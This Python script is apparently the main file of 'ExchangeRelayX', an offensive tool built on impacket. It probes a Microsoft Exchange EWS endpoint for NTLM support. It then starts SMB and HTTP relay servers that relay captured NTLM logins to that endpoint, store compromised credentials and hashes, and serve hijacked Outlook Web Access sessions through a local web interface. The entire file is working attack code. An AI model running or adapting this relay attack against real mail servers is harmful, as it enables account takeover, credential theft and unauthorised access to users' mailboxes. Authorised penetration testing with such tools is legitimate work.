#!/usr/bin/python3

from multiprocessing import Manager
from threading import Thread, Lock
import logging
from impacket.examples import logger
import argparse
import urllib3
import requests
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPSRelayClient
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from lib import ExchangePlugin, OWAServer

# Disable unnecessary warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.DependencyWarning)

# Initialize logger
logger.init()
logging.getLogger().setLevel(logging.INFO)

VERSION = "1.0.1"  # Updated version

def banner():
    print(r"""
 ____           _                            _____      _            __   __
|___ \         | |                          |  __ \    | |           \ \ / /
  __) |_  _____| |__   __ _ _ __   __ _  ___| |__) |___| | __ _ _   _ \ V /
 |__ <\ \/ / __| '_ \ / _` | '_ \ / _` |/ _ \  _  // _ \ |/ _` | | | | > <
 ___) |>  < (__| | | | (_| | | | | (_| |  __/ | \ \  __/ | (_| | |_| |/ . \
|____//_/\_\___|_| |_|\__,_|_| |_|\__, |\___|_|  \_\___|_|\__,_|\__, /_/ \_\
                                   __/ |                         __/ |
                                  |___/                         |___/
    """)

    print(f"ExchangeRelayX\nVersion: {VERSION}\n")

def parse_command_line():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser()
    parser._optionals.title = "Standard arguments"
    parser.add_argument('-t', metavar='targeturl', type=str, help='The target base URL (e.g., https://mail.vulncorp.com/)', required=True)
    parser.add_argument('-c', action="store_true", default=None, help='Check if the target supports NTLM authentication, then exit')
    parser.add_argument('-o', '--outfile', metavar="HASHES.txt", default=None, help='Store captured hashes in the provided file')
    parser.add_argument('-l', metavar="IP", default="127.0.0.1", help='Host to serve the hacked OWA web sessions (default: 127.0.0.1)')
    parser.add_argument('-p', metavar="port", default=8000, type=int, help='Port to serve the hacked OWA web sessions (default: 8000)')
    
    args = parser.parse_args()
    return args.t, args.outfile, args.l, args.p, args.c

def check_ntlm(url):
    """Check if the target supports NTLM authentication."""
    logging.info(f"Testing {url} for NTLM authentication support...")
    try:
        response = requests.get(url, verify=False)
        if 'WWW-Authenticate' not in response.headers:
            logging.error(f"Error: Authentication headers not found at {url} - Is EWS available?")
            return False
        if 'NTLM' in response.headers['WWW-Authenticate']:
            logging.info("SUCCESS - Server supports NTLM authentication")
            return True
        else:
            logging.info("FAILURE - Server does not support NTLM authentication")
            return False
    except Exception as e:
        logging.error(f"[checkNTLM] {e}")
        return False

def start_servers(target_url, hash_output_file=None, server_ip="127.0.0.1", server_port=8000):
    """Start relay and OWA servers."""
    popped_db = Manager().dict()  # Dictionary to store compromised credentials
    popped_db_lock = Lock()  # Lock for thread safety

    relay_servers = (SMBRelayServer, HTTPRelayServer)
    server_threads = []

    attack_config = {"HTTPS": ExchangePlugin}

    for server in relay_servers:
        config = NTLMRelayxConfig()
        config.setProtocolClients({"HTTPS": HTTPSRelayClient})
        config.setTargets(TargetsProcessor(singleTarget=str(target_url + "/")))
        config.setOutputFile(hash_output_file)
        config.setMode('RELAY')
        config.setAttacks(attack_config)
        config.setInterfaceIp("0.0.0.0")
        config.PoppedDB = popped_db  # Pass credential storage to relay servers
        config.PoppedDB_Lock = popped_db_lock  # Pass lock for thread safety
        config.setSMB2Support(True)
        
        relay_server = server(config)
        relay_server.start()
        server_threads.append(relay_server)

    logging.info("Relay servers started")

    # Start the WebUI on 127.0.0.1:8000
    owa_thread = Thread(target=OWAServer.runServer, args=(server_ip, server_port, popped_db, popped_db_lock))
    owa_thread.daemon = True
    owa_thread.start()

    try:
        while owa_thread.is_alive():
            pass
    except KeyboardInterrupt:
        logging.info("Shutting down...")
        for thread in server_threads:
            thread.server.shutdown()

if __name__ == "__main__":
    banner()
    target_url, output_file, server_ip, server_port, just_check = parse_command_line()

    if target_url.endswith("/"):
        target_url += "EWS/Exchange.asmx"
    else:
        target_url += "/EWS/Exchange.asmx"

    if not check_ntlm(target_url):
        exit(0)
    if just_check:
        exit(0)

    start_servers(target_url, output_file, server_ip, server_port)
